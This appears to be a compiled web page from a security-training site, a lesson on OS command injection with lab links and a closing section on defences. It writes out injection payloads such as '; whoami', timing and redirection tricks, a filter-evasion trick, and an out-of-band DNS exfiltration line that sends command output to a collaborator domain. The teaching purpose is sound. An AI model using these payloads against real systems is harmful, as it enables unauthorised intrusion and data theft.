import{_ as c,C as n,o as l,c as p,a6 as o,j as t,a,E as s,w as h}from"./chunks/framework.CMg4qq8Q.js";const T=JSON.parse('{"title":"OS Command Injection · Case File 15 (System Shells)","description":"Follow user input as it escapes web applications into the operating system terminal, explore command separators, and master in-band and blind exfiltration channels.","frontmatter":{"title":"OS Command Injection · Case File 15 (System Shells)","description":"Follow user input as it escapes web applications into the operating system terminal, explore command separators, and master in-band and blind exfiltration channels."},"headers":[],"relativePath":"command-injection/index.md","filePath":"command-injection/index.md"}'),m={name:"command-injection/index.md"},u={class:"wd-case"},g={class:"wd-step wd-step--break"};function w(k,e,b,v,y,f){const d=n("Term"),i=n("LabGroup"),r=n("TopicComplete");return l(),p("div",null,[e[20]||(e[20]=o('<h1 id="os-command-injection-·-the-terminal-hijack-investigation" tabindex="-1">OS Command Injection · The Terminal Hijack Investigation <a class="header-anchor" href="#os-command-injection-·-the-terminal-hijack-investigation" aria-label="Permalink to &quot;OS Command Injection · The Terminal Hijack Investigation&quot;">​</a></h1><p class="wd-section-lede">OS command injection is one of the most severe backend vulnerabilities on the web. It occurs when a web server takes untrusted user input and pastes it directly into a system terminal command. Because the operating system terminal interprets certain punctuation marks as instructions to chain or redirect commands, an attacker can append their own instructions and take control of the server operating system.</p><div class="wd-callout"><p><strong>💡 Everyday Analogy: The Voice Assistant Trap.</strong> Imagine speaking to a smart home voice assistant: <em>&quot;Add milk to my grocery list.&quot;</em> The assistant dutifully adds &quot;milk&quot;. But what if someone says: <em>&quot;Add milk to my grocery list; and unlock the front door&quot;</em>? If the assistant isn&#39;t programmed to treat everything following &quot;Add&quot; as grocery text, it interprets the semicolon as a cue to start a brand-new task—and unlocks your door. In OS command injection, the system shell (Bash or cmd.exe) is that obedient assistant.</p></div><hr><h2 id="case-file-15-behind-the-scenes-of-a-stock-checker" tabindex="-1">Case File #15: Behind the Scenes of a Stock Checker <a class="header-anchor" href="#case-file-15-behind-the-scenes-of-a-stock-checker" aria-label="Permalink to &quot;Case File #15: Behind the Scenes of a Stock Checker&quot;">​</a></h2><p>Let&#39;s examine what happens when an e-commerce website checks how many items remain in a local warehouse.</p>',6)),t("div",u,[e[18]||(e[18]=o(`<div class="wd-step wd-step--see"><span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span><p>You view a product page and click <strong>Check stock</strong>. In your browser&#39;s network tab, you observe a POST request sent to the server:</p><div class="language-http"><pre><code>POST /product/stock HTTP/1.1
productId=1&amp;storeId=2</code></pre></div><p>The screen immediately updates with the message: <code>&quot;53 items in stock&quot;</code>.</p></div><div class="wd-step wd-step--server"><span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span><p>Instead of querying a database directly, the backend was written by a developer who reused an existing internal command-line tool. The web application builds a shell command by gluing your input onto the terminal line:</p><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Blue</span> = Server Terminal Command</span><span><span class="wd-code-input">Gold</span> = Input From Your HTTP Request</span></div><span class="wd-code-dev">/usr/local/bin/stockcheck.sh 1 </span><span class="wd-code-input">2</span></div></div>`,2)),t("div",g,[e[17]||(e[17]=t("span",{class:"wd-step__tag"},"💥 Step 3 · Where the Logic Breaks",-1)),t("p",null,[e[1]||(e[1]=a("The developer assumed ",-1)),e[2]||(e[2]=t("code",null,"storeId",-1)),e[3]||(e[3]=a(" would only ever be a single digit like ",-1)),e[4]||(e[4]=t("code",null,"2",-1)),e[5]||(e[5]=a(". But if you submit ",-1)),e[6]||(e[6]=t("code",null,"2 & whoami",-1)),e[7]||(e[7]=a(", the system shell recognizes ",-1)),e[8]||(e[8]=t("code",null,"&",-1)),e[9]||(e[9]=a(" as a ",-1)),s(d,{id:"shell-metacharacter"},{default:h(()=>[...e[0]||(e[0]=[a("shell separator",-1)])]),_:1}),e[10]||(e[10]=a(". It runs ",-1)),e[11]||(e[11]=t("code",null,"stockcheck.sh 1 2",-1)),e[12]||(e[12]=a(" in the background, immediately executes ",-1)),e[13]||(e[13]=t("code",null,"whoami",-1)),e[14]||(e[14]=a(", and prints the server user account (e.g. ",-1)),e[15]||(e[15]=t("code",null,"peter-user",-1)),e[16]||(e[16]=a(") directly into the web page!",-1))])]),e[19]||(e[19]=t("div",{class:"wd-step wd-step--fix"},[t("span",{class:"wd-step__tag"},"🛡️ Step 4 · How Developers Lock It Down"),t("p",null,[a("Developers avoid invoking the system shell altogether. By using argument-vector APIs (like "),t("code",null,"execFile"),a(" in Node.js or "),t("code",null,'subprocess.run(["cmd", arg], shell=False)'),a(" in Python), the operating system launches the binary directly without passing the text through a shell parser. Punctuation characters like "),t("code",null,";"),a(" or "),t("code",null,"&"),a(" are treated as harmless literal text.")])],-1))]),e[21]||(e[21]=o('<h3 id="visual-comparison-concatenation-vs-parameter-arrays" tabindex="-1">Visual Comparison: Concatenation vs. Parameter Arrays <a class="header-anchor" href="#visual-comparison-concatenation-vs-parameter-arrays" aria-label="Permalink to &quot;Visual Comparison: Concatenation vs. Parameter Arrays&quot;">​</a></h3><div class="wd-compare"><div class="wd-compare__card wd-compare__card--expect"><span class="wd-compare__title">💭 What the Developer Expected</span><p>The developer thought <code>storeId</code> would always be an integer like <code>1</code> or <code>2</code>. The shell would execute one program with two numerical arguments and print the warehouse inventory.</p></div><div class="wd-compare__card wd-compare__card--actual"><span class="wd-compare__title">💥 What Actually Happened</span><p>The user entered <code>2; whoami</code>. Because the code invoked a shell (e.g., <code>system()</code> or <code>exec()</code>), the shell treated <code>;</code> as a command terminator and spawned <code>whoami</code> as a completely independent second command.</p></div></div><h3 id="watch-the-command-split-color-by-color" tabindex="-1">Watch the Command Split Color by Color <a class="header-anchor" href="#watch-the-command-split-color-by-color" aria-label="Permalink to &quot;Watch the Command Split Color by Color&quot;">​</a></h3><p>See how punctuation changes the sentence structure of a shell command:</p><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Blue</span> = Intended Server Command</span><span><span class="wd-code-input">Gold</span> = Injected Separator &amp; Command</span></div><span class="wd-code-dev">/usr/local/bin/stockcheck.sh 1 </span><span class="wd-code-input">2; whoami</span></div><details class="details custom-block"><summary>🔬 Under the Hood: Why Passing Arguments as an Array Cures the Bug</summary><p>When code calls:</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># VULNERABLE: Invokes /bin/sh to interpret the full string</span></span>\n<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">os.system(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;stockcheck.sh </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">product_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> {</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">store_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>The OS starts <code>/bin/sh -c &quot;stockcheck.sh 1 2; whoami&quot;</code>. The shell lexes the string, discovers the semicolon, and runs two commands.</p><p>In contrast, when code uses an argument array:</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># SECURE: Direct system call (execve), NO shell is launched</span></span>\n<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">subprocess.run([</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/usr/local/bin/stockcheck.sh&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, product_id, store_id], </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">shell</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">False</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>The operating system calls the low-level <code>execve</code> syscall. The string <code>&quot;2; whoami&quot;</code> is passed directly into <code>argv[2]</code> of <code>stockcheck.sh</code>. Because no shell is ever spawned to interpret the semicolon, the script simply looks for a store literally named <code>&quot;2; whoami&quot;</code> and safely reports that no such store exists.</p></details><hr><h2 id="the-5-stage-journey-of-an-injected-command" tabindex="-1">The 5-Stage Journey of an Injected Command <a class="header-anchor" href="#the-5-stage-journey-of-an-injected-command" aria-label="Permalink to &quot;The 5-Stage Journey of an Injected Command&quot;">​</a></h2><p>Tracing how an operating system processes terminal commands explains why separators behave the way they do:</p><div class="wd-flow"><div class="wd-flow__node"><strong>1. HTTP Request</strong> Browser sends input containing metacharacters (e.g. <code>storeId=2|whoami</code>). </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--danger"><strong>2. Shell Spawn</strong> Web app executes <code>system()</code>, spawning <code>/bin/sh -c</code> with concatenated text. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node"><strong>3. Metacharacter Tokenization</strong> Shell parser identifies <code>|</code> or <code>;</code> as command boundary tokens. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node"><strong>4. Command Execution</strong> Kernel executes the primary binary and then proceeds to the secondary command. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--safe"><strong>5. Output Collection</strong> Output is reflected in HTTP response or observed via a side-channel. </div></div><hr><h2 id="the-detective-s-metacharacter-toolkit" tabindex="-1">The Detective&#39;s Metacharacter Toolkit <a class="header-anchor" href="#the-detective-s-metacharacter-toolkit" aria-label="Permalink to &quot;The Detective&#39;s Metacharacter Toolkit&quot;">​</a></h2><p>System shells support a rich grammar of punctuation marks. Here are the primary characters used to chain commands and control data flow:</p><table tabindex="0"><thead><tr><th>Separator</th><th>Shell Behavior</th><th>When to Use It</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td>Runs the command on the left in the background and immediately starts the next command.</td><td>Great when the first command takes a long time or hangs.</td></tr><tr><td><code>&amp;&amp;</code></td><td>Runs the second command only if the first command succeeds (exit code 0).</td><td>Clean chaining when original arguments are valid.</td></tr><tr><td><code>|</code></td><td>Pipes the standard output of the left command into the input of the right command.</td><td>Works when the original command doesn&#39;t mind receiving piped data.</td></tr><tr><td><code>||</code></td><td>Runs the second command only if the first command fails (non-zero exit code).</td><td>Ideal when your input invalidates the original command!</td></tr><tr><td><code>;</code> or <code>\\n</code></td><td>Runs commands sequentially, regardless of whether the first succeeded.</td><td>The universal sequential separator on Unix/Linux.</td></tr><tr><td><code>$(cmd)</code> or <code>`cmd`</code></td><td>Command substitution: executes <code>cmd</code> and inserts its text output in place.</td><td>Perfect for embedding command results into URLs or filenames.</td></tr></tbody></table><details class="details custom-block"><summary>⚙️ Engine Variations: Linux (Bash/sh) vs. Windows (cmd.exe / PowerShell)</summary><ul><li><strong>Linux (<code>/bin/sh</code>, <code>bash</code>):</strong> Uses <code>;</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>||</code>, and newlines (<code>\\n</code>). Command substitution uses <code>$(whoami)</code> or <code>`whoami`</code>. Whitespace can be substituted with <code>${IFS}</code> if spaces are filtered.</li><li><strong>Windows (<code>cmd.exe</code>):</strong> Semicolons do not separate commands! Use <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, or <code>||</code>. Environment variables use <code>%USERNAME%</code>. To test delays, use <code>ping -n 10 127.0.0.1</code> instead of <code>sleep</code>.</li><li><strong>Windows (PowerShell):</strong> Uses <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>||</code>, and <code>$(command)</code>. Backtick (<code>`</code>) is the escape character.</li></ul></details><hr><h2 id="direct-in-band-command-execution" tabindex="-1">Direct In-Band Command Execution <a class="header-anchor" href="#direct-in-band-command-execution" aria-label="Permalink to &quot;Direct In-Band Command Execution&quot;">​</a></h2><p>In the simplest scenario, the web server captures whatever the terminal prints (<code>stdout</code>) and reflects it directly into the HTML response. When you append a command separator and a command like <code>whoami</code>, the current system user is printed on screen.</p>',18)),s(i,{ids:"command-injection-lab-simple"}),e[22]||(e[22]=o('<hr><h2 id="the-4-blind-channels-investigating-without-screen-output" tabindex="-1">The 4 Blind Channels: Investigating Without Screen Output <a class="header-anchor" href="#the-4-blind-channels-investigating-without-screen-output" aria-label="Permalink to &quot;The 4 Blind Channels: Investigating Without Screen Output&quot;">​</a></h2><p>In real-world audits, web applications rarely print terminal output back to the screen. The server runs the command in the background, discards the output, and returns a generic &quot;Thank you&quot; or &quot;Stock checked&quot; response. When the screen gives you no clues, you investigate using <strong>side channels</strong>:</p><div class="wd-flow"><div class="wd-flow__node"><strong>⏱️ 1. Time Delays</strong> Make the server pause (e.g., <code>sleep 10</code>). If the response takes exactly 10 seconds, the command ran! </div><div class="wd-flow__node"><strong>📁 2. Output Redirection</strong> Write command output to a public web folder (<code>whoami &gt; /var/www/static/out.txt</code>) and browse to it. </div><div class="wd-flow__node"><strong>📡 3. Out-of-Band (OAST)</strong> Trigger a DNS lookup or HTTP request to your own server using tools like <code>nslookup</code> or <code>curl</code>. </div><div class="wd-flow__node wd-flow__node--danger"><strong>📦 4. Data Exfiltration</strong> Embed command results inside a DNS lookup: <code>nslookup $(whoami).your-subdomain.com</code>. </div></div><h3 id="_1-timing-delays" tabindex="-1">1. Timing Delays <a class="header-anchor" href="#_1-timing-delays" aria-label="Permalink to &quot;1. Timing Delays&quot;">​</a></h3><p>If the server doesn&#39;t show output, you can ask it to sleep. If a request normally takes 120ms, but supplying <code>|| sleep 10 #</code> causes the response to take exactly 10,120ms, you have confirmed code execution.</p><h3 id="_2-output-redirection" tabindex="-1">2. Output Redirection <a class="header-anchor" href="#_2-output-redirection" aria-label="Permalink to &quot;2. Output Redirection&quot;">​</a></h3><p>If the web server has write permissions to a static folder (like <code>/var/www/images/</code>), you can use shell redirection (<code>&gt;</code>) to write command output into a file and then load that file in your browser: <code>|| whoami &gt; /var/www/static/whoami.txt #</code>.</p><h3 id="_3-out-of-band-oast-signals" tabindex="-1">3. Out-of-Band (OAST) Signals <a class="header-anchor" href="#_3-out-of-band-oast-signals" aria-label="Permalink to &quot;3. Out-of-Band (OAST) Signals&quot;">​</a></h3><p>Firewalls may block incoming traffic and responses, but outgoing DNS queries are often allowed. Triggering a DNS request using <code>nslookup</code> or <code>dig</code> against a Burp Collaborator domain confirms execution even when no HTTP connection can leave the network.</p><h3 id="_4-out-of-band-exfiltration" tabindex="-1">4. Out-of-Band Exfiltration <a class="header-anchor" href="#_4-out-of-band-exfiltration" aria-label="Permalink to &quot;4. Out-of-Band Exfiltration&quot;">​</a></h3><p>By combining command substitution with an out-of-band lookup, the server runs a command, captures the output, and attaches it as a subdomain prefix on a DNS query: <code>nslookup $(whoami).burpcollaborator.net</code>. Your DNS listener receives a lookup for <code>peter-user.burpcollaborator.net</code>, reading data out of the network!</p>',12)),s(i,{ids:"command-injection-lab-blind-time-delays, command-injection-lab-blind-output-redirection, command-injection-lab-blind-out-of-band, command-injection-lab-blind-out-of-band-data-exfiltration"}),e[23]||(e[23]=o('<hr><h2 id="defensive-blueprint-eliminating-command-injection" tabindex="-1">Defensive Blueprint: Eliminating Command Injection <a class="header-anchor" href="#defensive-blueprint-eliminating-command-injection" aria-label="Permalink to &quot;Defensive Blueprint: Eliminating Command Injection&quot;">​</a></h2><p>Protecting applications from command injection requires eliminating shells from the architecture:</p><div class="wd-callout wd-callout--warn"><p><strong>🛡️ The 3 Layers of Terminal Security:</strong></p><ol><li><strong>Avoid system shells entirely (Best Practice):</strong> Use built-in programming language APIs instead of command-line tools. For example, to read a file or resize an image, use native libraries rather than calling <code>cat</code> or <code>ImageMagick</code> via the shell.</li><li><strong>Pass arguments as vectors (execve):</strong> If invoking an external binary is mandatory, use APIs that pass arguments as an explicit list/array (e.g. <code>ProcessBuilder</code> in Java, <code>subprocess.run([&quot;cmd&quot;, arg], shell=False)</code> in Python). Never pass a concatenated string to <code>/bin/sh</code>.</li><li><strong>Strict input allowlisting:</strong> Validate that arguments conform to a strict whitelist of expected characters (e.g. numbers only: <code>^[0-9]+$</code>). Reject any input containing unexpected punctuation.</li></ol></div>',4)),s(r,{"topic-id":"os-command-injection",label:"Mark OS command injection complete"})])}const x=c(m,[["render",w]]);export{T as __pageData,x as default};
